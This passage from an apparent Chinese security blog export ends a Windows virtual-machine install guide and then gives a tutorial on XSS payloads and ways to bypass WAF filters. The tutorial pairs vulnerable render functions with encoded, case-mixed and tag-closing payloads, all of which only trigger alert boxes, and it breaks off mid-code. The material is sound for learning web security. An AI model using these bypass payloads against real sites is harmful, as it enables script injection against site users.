start="17"><li>编辑虚拟机设置。</li></ol><p><img src="https://s2.51cto.com/images/202203/63e186d01edc8d3cace84448a33bca4dd2c59e.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="18"><li>选择下载好的 win  IOS 镜像，然后确定。</li></ol><p><img src="https://s2.51cto.com/images/202203/82cb2dd42ad01a5d75259997aed4c49905feb6.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="19"><li>开启虚拟机。</li></ol><p><img src="https://s2.51cto.com/images/202203/d642ec8035ebfa4e1a219909beabe8b511a655.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="20"><li>下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/114446085850fc8b0958646c45d1ea807dc154.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="21"><li>现在安装。</li></ol><p><img src="https://s2.51cto.com/images/202203/897002689736d54e02c1802f8e61b0db4be5f5.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="22"><li>选择自己喜欢的版本，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/b78bdcf26a35ab29814737d891152b1cb63966.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="23"><li>把我接受勾上，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/d6167740295a730062b178f1c7a28bf590436e.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="24"><li>选择自定义：安装。</li></ol><p><img src="https://s2.51cto.com/images/202203/058961590812c0f074e588dcd74f68e72c973e.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="25"><li>这里可按自己的需求来分区，也可以安装好后再分区。</li></ol><p><img src="https://s2.51cto.com/images/202203/180364724c7d81d5bbd96742fe31bd1f746f6d.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="26"><li>等待系统安装。</li></ol><p><img src="https://s2.51cto.com/images/202203/19eb7199428877dc9770922d0feb3be073f270.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="27"><li>选择中国。</li></ol><p><img src="https://s2.51cto.com/images/202203/a4e3bdd32b40cbab19551293c99911170148ad.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="28"><li>选择微软拼音。</li></ol><p><img src="https://s2.51cto.com/images/202203/46ce3b906ab199f4154592cd3cd3e2ec8dbfd5.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="29"><li>选择跳过。</li></ol><p><img src="https://s2.51cto.com/images/202203/e581ec6942fd35482a99582eb98d8d50eeacdc.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="30"><li>选择针对个人，下一步。</li></ol><p><img src="https://s2.51cto.com/images/202203/f9c498551127a96cad5215eebb31a375dd9761.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="31"><li><p>不想输入邮箱，就选择创建用户。</p></li><li><p>创建用户名，根据自己喜好来设置。</p></li></ol><p><img src="https://s2.51cto.com/images/202203/e90707c75f6bac4c3c4943232fe9b374d6f107.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="33"><li>创建密码。</li></ol><p><img src="https://s2.51cto.com/images/202203/763c1f252ef817ce2384147ab5e87d76d67b75.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="34"><li>选择否</li></ol><p><img src="https://s2.51cto.com/images/202203/6114ca389279a0a7dd168000c7f58466fe7476.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="35"><li>选择拒绝。</li></ol><p><img src="https://s2.51cto.com/images/202203/73baeab21bd7b9f73a1313d43f040305309b84.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="36"><li>全部选择否，再点击接受。</li></ol><p><img src="https://s2.51cto.com/images/202203/5999cbb70245bf420e80823d431f133c127584.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p><ol start="37"><li><p>继续等待。<img src="https://s2.51cto.com/images/202203/b9babc40293647c22b167493f5967c7eb866bf.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp"></p></li><li><p>大功告成了。</p></li></ol><p><img src="https://s2.51cto.com/images/202203/684b49594b2442b5a3d0825ff983fa20c26330.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=,x-oss-process=image/resize,m_fixed,w_1184/format,webp">10</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS的Waf绕过及工具使用</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/XSS%E7%9A%84Waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/XSS%E7%9A%84Waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、常用-payload"><a href="#一、常用-payload" class="headerlink" title="一、常用 payload"></a>一、常用 payload</h1><h2 id="1、echo"><a href="#1、echo" class="headerlink" title="1、echo"></a>1、echo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="2、img-标签"><a href="#2、img-标签" class="headerlink" title="2、img 标签"></a>2、img 标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&quot;xss&quot;)&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;</span><br><span class="line">&lt;img scr=&quot;URL&quot; style=&#x27;Xss:expression(alert(xss));&#x27;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;</span><br><span class="line">&lt;img src=x onmouseover=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure><h2 id="3、CSS"><a href="#3、CSS" class="headerlink" title="3、CSS"></a>3、CSS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img STYLE=&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="4、href"><a href="#4、href" class="headerlink" title="4、href"></a>4、href</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;</span><br><span class="line">XSS利用方式1</span><br><span class="line">&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line"> &lt;a href=javascript:eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;</span><br><span class="line"> &lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;</span><br><span class="line"> XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line"> &lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;aa&lt;/a&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;</span><br><span class="line">XSS利用方式4</span><br><span class="line">&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="5、form-标签"><a href="#5、form-标签" class="headerlink" title="5、form 标签"></a>5、form 标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XSS利用方式1</span><br><span class="line">&lt;form action=javascript:alert(&#x27;xss&#x27;) method=&quot;get&quot;&gt;</span><br><span class="line">&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;form action=1 onmouseover=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure><h2 id="6、input-标签"><a href="#6、input-标签" class="headerlink" title="6、input 标签"></a>6、input 标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;input &gt;</span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;</span><br><span class="line">利用方式2</span><br><span class="line">&lt;input &gt;</span><br><span class="line">利用方式4</span><br><span class="line">&lt;input &gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="7、iframe-标签"><a href="#7、iframe-标签" class="headerlink" title="7、iframe 标签"></a>7、iframe 标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XSS利用方式1</span><br><span class="line">&lt;iframe src=javascript:alert(&#x27;xss&#x27;);height=5width=1000 /&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line"> &lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line"> &lt;!--base64编码--&gt;</span><br><span class="line"> &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src=&quot;aaa&quot; οnmοuseοver=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;iframe src=&quot;javascript:prompt(`xss`)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h2 id="8、svg-标签"><a href="#8、svg-标签" class="headerlink" title="8、svg 标签"></a>8、svg 标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="9、其他"><a href="#9、其他" class="headerlink" title="9、其他"></a>9、其他</h2><ul><li>事件型还有 onbody 标签</li></ul><h1 id="二、常用的绕过-Waf"><a href="#二、常用的绕过-Waf" class="headerlink" title="二、常用的绕过 Waf"></a>二、常用的绕过 Waf</h1><h2 id="1、利用大小写绕过"><a href="#1、利用大小写绕过" class="headerlink" title="1、利用大小写绕过"></a>1、利用大小写绕过</h2><p>这个绕过方式的出现是因为网站仅仅只过滤了<code>&lt;script&gt;</code>标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。具体的方式就像这样： <code>&lt;sCriPt&gt;alert(1)&lt;/SCripT&gt;</code></p><h2 id="2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）"><a href="#2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）" class="headerlink" title="2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）"></a>2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）</h2><p>有的只过滤了一次 script 标签，因此可以使用双写来绕过<code>&lt;sCri&lt;script&gt;Pt&gt;alert(1)&lt;/SC&lt;/script&gt;ripT&gt;</code></p><h2 id="3、并不是只有-script-标签才可以插入代码"><a href="#3、并不是只有-script-标签才可以插入代码" class="headerlink" title="3、并不是只有 script 标签才可以插入代码"></a>3、并不是只有 script 标签才可以插入代码</h2><h3 id="（1）img-标签"><a href="#（1）img-标签" class="headerlink" title="（1）img 标签"></a>（1）img 标签</h3><p><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code>就可以再次愉快的弹窗。原因很简单，我们指定的图片地址根本不存在也就是一定会发生错误，这时候 onerror 里面的代码自然就得到了执行。</p><h3 id="（2）onmouseover-事件"><a href="#（2）onmouseover-事件" class="headerlink" title="（2）onmouseover 事件"></a>（2）onmouseover 事件</h3><ul><li><p><code>onmouseover=&quot;alert(1)&quot;</code>，比如</p><ul><li><p><code>&lt;a onmousemove=&quot;do something here&quot;&gt;</code> 当用户鼠标移动时即可运行代码</p></li><li><p><code>&lt;div onmouseover=&quot;do something here&quot;&gt;</code> 当用户鼠标在这个块上面时即可运行（可以配合 weight 等参数将 div 覆盖页面，鼠标不划过都不行）</p></li></ul></li></ul><h3 id="（3）onclick-事件"><a href="#（3）onclick-事件" class="headerlink" title="（3）onclick 事件"></a>（3）onclick 事件</h3><p><code>onclick=&quot;alert(1)&quot;</code> 这个要点击后才能运行代码，条件相对苛刻，就不再详述。</p><h3 id="（4）onload-事件"><a href="#（4）onload-事件" class="headerlink" title="（4）onload 事件"></a>（4）onload 事件</h3><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> let domainRe = /^https?:\/\/www\.segmentfault\.com/ //http...或https....</span><br><span class="line"> if (domainRe.test(input)) &#123;  //是否包含在input中</span><br><span class="line"> return `&lt;script src=&quot;$&#123;input&#125;&quot;&gt;&lt;/script&gt;`</span><br><span class="line"> &#125;</span><br><span class="line"> return &#x27;Invalid URL&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>http://www.segmentfault.com&quot; onload=&quot;alert(1)</code></p><h2 id="4、编码脚本绕过关键字过滤"><a href="#4、编码脚本绕过关键字过滤" class="headerlink" title="4、编码脚本绕过关键字过滤"></a>4、编码脚本绕过关键字过滤</h2><h3 id="（1）Javascript-的编码-–eval-函数"><a href="#（1）Javascript-的编码-–eval-函数" class="headerlink" title="（1）Javascript 的编码 –eval() 函数"></a>（1）Javascript 的编码 –eval() 函数</h3><p><code>\uXXXX</code> 这种写法的 Unicode 转义序列，表示一个字符，其中 XXXX 表示一个 16 进制数字，如 &lt; 的 Unicode 编码为 \ u003c。</p><p>有的时候，服务器往往会对代码中的关键字（如 alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句 eval() 来实现。eval() 会将编码过的语句解码后再执行，简直太贴心了。</p><p>例如 alert(1) 编码过后就是<code>\u0061\u006c\u0065\u0072\u0074(1)</code>（对应于 ASCII 码的十六进制）</p><p>所以构建出来的攻击语句如下：<code>&lt;script&gt;eval(\u0061\u006c\u0065\u0072\u0074(1))&lt;/script&gt;</code></p><h3 id="（2）HTML-实体编码"><a href="#（2）HTML-实体编码" class="headerlink" title="（2）HTML 实体编码"></a>（2）HTML 实体编码</h3><p>实体编码字符<code>&lt;svg&gt;</code>（翻译官）</p><p>把要转码的先 Unicode 转换一下，然后后台看到有翻译官会把 Unincode 编码转回为当初的字符</p><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> const stripBracketsRe = /[()`]/g    //正则表达式，看//包裹的内容即可</span><br><span class="line"> input = input.replace(stripBracketsRe, &#x27;&#x27;)  把()`替换为空</span><br><span class="line"> return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 因为控制字符 () 变成了实体编码因此要使用翻译官才能让 () 正确发挥控制字符的作用</p><h3 id="（3）翻译官（Unicode-编码）"><a href="#（3）翻译官（Unicode-编码）" class="headerlink" title="（3）翻译官（Unicode 编码）"></a>（3）翻译官（Unicode 编码）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.toUpperCase()  //把所有的输出内容都大写</span><br><span class="line"> return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;</code> 👈HTML 编码或者<code>&lt;svg&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;</code>👈Unicode 编码</p><h2 id="5、主动闭合标签实现注入代码"><a href="#5、主动闭合标签实现注入代码" class="headerlink" title="5、主动闭合标签实现注入代码"></a>5、主动闭合标签实现注入代码</h2><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> return &#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27; + input + &#x27;&quot;&gt;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input type=&#39;name&#39; value=&quot;</code> 或者 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="6、绕过小括号"><a href="#6、绕过小括号" class="headerlink" title="6、绕过小括号 ()"></a>6、绕过小括号 ()</h2><p>在前端中，反引号 &#96; 可以当作小括号来使用</p><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> const stripBracketsRe = /[()]/g   //正则表达式，看//中间的内容即可</span><br><span class="line"> input = input.replace(stripBracketsRe, &#x27;&#x27;)  //把[()]替换为空</span><br><span class="line"> return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&lt;script&gt;alert`1`&lt;/script&gt;</code></p><h2 id="7、绕过-96"><a href="#7、绕过-96" class="headerlink" title="7、绕过 ()&#96;"></a>7、绕过 ()&#96;</h2><h3 id="1-使用-HTML-实体编码"><a href="#1-使用-HTML-实体编码" class="headerlink" title="(1) 使用 HTML 实体编码"></a>(1) 使用 HTML 实体编码</h3><p>如上文所述</p><h2 id="8、绕过-HTML-注释符"><a href="#8、绕过-HTML-注释符" class="headerlink" title="8、绕过 HTML 注释符"></a>8、绕过 HTML 注释符</h2><p>有两种注释方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 注释内容 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 注释内容 --!&gt;</span><br></pre></td></tr></table></figure><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/--&gt;/g, &#x27;😂&#x27;)  //将--&gt;替换为笑脸</span><br><span class="line"> return &#x27;&lt;!-- &#x27; + input + &#x27; --&gt;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：使用另一个注释符来畸形进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure><h2 id="9、利用换行符绕过"><a href="#9、利用换行符绕过" class="headerlink" title="9、利用换行符绕过"></a>9、利用换行符绕过</h2><p>%0a– 换行符</p><p>比如以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/auto|on.*=|&gt;/ig, &#x27;_&#x27;) //auto或on开头，后面跟任意东西，直到出现=或者&gt;都转化成_</span><br><span class="line"> return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><p>在前端的世界里，换行一样有用，因此这里通过换行来避免 on 碰到 &#x3D;</p><h2 id="10、绕过右标签"><a href="#10、绕过右标签" class="headerlink" title="10、绕过右标签"></a>10、绕过右标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line"></span><br><span class="line"> input = input.replace(stripTagsRe, &#x27;&#x27;) //所有标签类的，只让写左标签，右标签一加，就替换为空</span><br><span class="line"> return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>匹配 &lt;&#x2F; 任意字符&gt;，而且 &#x2F; i 过滤了大小写，但 html 的单标签也可以解析</p><p>payload：<code>&lt;img src=x onerror=&quot;alert(1)&quot;</code></p><h2 id="11、绕过-lt-x2F-内容-gt"><a href="#11、绕过-lt-x2F-内容-gt" class="headerlink" title="11、绕过 &lt;&#x2F; 内容&gt;"></a>11、绕过 &lt;&#x2F; 内容&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line"> src = src.replace(/&lt;\/style&gt;/ig, &#x27;/* \u574F\u4EBA */&#x27;) //碰到&lt;/style&gt;就替换成/*坏人*/</span><br><span class="line"> return `</span><br><span class="line"> &lt;style&gt;</span><br><span class="line"> $&#123;src&#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line"> `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（1）使用换行"><a href="#（1）使用换行" class="headerlink" title="（1）使用换行"></a>（1）使用换行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;style&gt;</span><br></pre></td></tr></table></figure><h3 id="（2）使用空格"><a href="#（2）使用空格" class="headerlink" title="（2）使用空格"></a>（2）使用空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;</span><br></pre></td></tr></table></figure><h2 id="12、引用指定网站下的目录文件"><a href="#12、引用指定网站下的目录文件" class="headerlink" title="12、引用指定网站下的目录文件"></a>12、引用指定网站下的目录文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.toUpperCase()  //把所有的输出内容都大写</span><br><span class="line"> return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span 